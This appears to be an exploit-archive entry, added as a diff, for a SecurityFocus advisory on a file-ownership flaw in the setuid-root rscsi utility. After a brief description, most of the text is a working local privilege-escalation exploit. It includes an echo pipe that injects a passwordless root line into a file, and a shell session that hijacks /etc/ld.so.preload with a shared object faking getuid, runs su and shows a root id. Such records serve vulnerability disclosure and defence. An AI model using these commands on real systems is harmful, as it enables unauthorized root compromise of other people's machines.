@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/8328/info
+
+It has been reported that the rscsi utility may provide for the modification of ownership and the corruption of arbitrary attacker specified files. 
+
+It has been reported that a local attacker may invoke the rscsi utility to corrupt or seize group ownership of an attacker specified file. Because the rscsi utility is installed with setuid 'root' permissions by default, a local attacker may harness this vulnerability to achieve elevated privileges.
+
+$ echo C`echo -e 
+"\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08r00t::0:0:root:/:/bin/bash\x0a"` | 
+/opt/schily/sbin/rscsi /tmp/lala
+
+
+[kf@vegeta kf]$ ls -al /etc/ld.so.preload
+ls: /etc/ld.so.preload: No such file or directory
+[kf@vegeta kf]$ cat > oops.c
+int getuid(void)
+{
+return(0);
+}
+[kf@vegeta kf]$ gcc -c -o oops.o oops.c
+[kf@vegeta kf]$ ld -shared -o oops.so oops.o
+[kf@vegeta kf]$ ls -al oops.so
+-rwxrwxr-x 1 kf kf 1714 Jul 30 18:53 oops.so
+[kf@vegeta kf]$ echo duh_kf | /opt/schily/sbin/rscsi /etc/ld.so.preload
+E0
+Garbage command
+0
+-rw-rw-r-- 1 root kf 1 Jul 30 19:29 /etc/ld.so.preload
+[kf@vegeta kf]$ echo /home/kf/oops.so > /etc/ld.so.preload
+[kf@vegeta kf]$ su
+[root@vegeta kf]# rm /etc/ld.so.preload
+rm: remove regular file `/etc/ld.so.preload'? y
+[root@vegeta kf]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
